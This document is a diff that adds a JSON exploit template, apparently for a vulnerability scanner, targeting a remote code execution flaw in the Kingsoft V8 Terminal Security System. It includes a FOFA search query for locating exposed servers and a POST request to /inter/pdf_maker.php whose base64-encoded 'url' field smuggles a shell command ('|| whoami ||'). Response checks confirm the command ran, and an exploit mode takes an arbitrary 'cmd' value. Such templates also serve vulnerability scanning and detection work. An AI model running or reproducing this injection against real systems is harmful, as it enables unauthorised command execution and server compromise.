@@ -1,0 +1,84 @@
+{
+  "Name": "kingsoft V8 terminal security system RCE",
+  "Description": "Kingsoft V8 Terminal Security System has a remote code execution vulnerability, may causing the server to be compromised.",
+  "Product": "kingsoft-V8-terminal-security-system",
+  "Homepage": "https://www.ejinshan.net/product_V8/index.html",
+  "DisclosureDate": "2019-11-13",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"kingsoft-V8+-Terminal-security-system\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://fofa.so/"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "url=IiB8fCB3aG9hbWkgfHw=&filename=xxx",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "POST",
+        "header": {
+          "Referer": "{{{fixedhostinfo}}}/",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Accept": "*/*",
+          "Accept-Language": "en"
+        },
+        "uri": "/inter/pdf_maker.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "nResult",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "whoami",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["kingsoft-V8-terminal-security-system"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
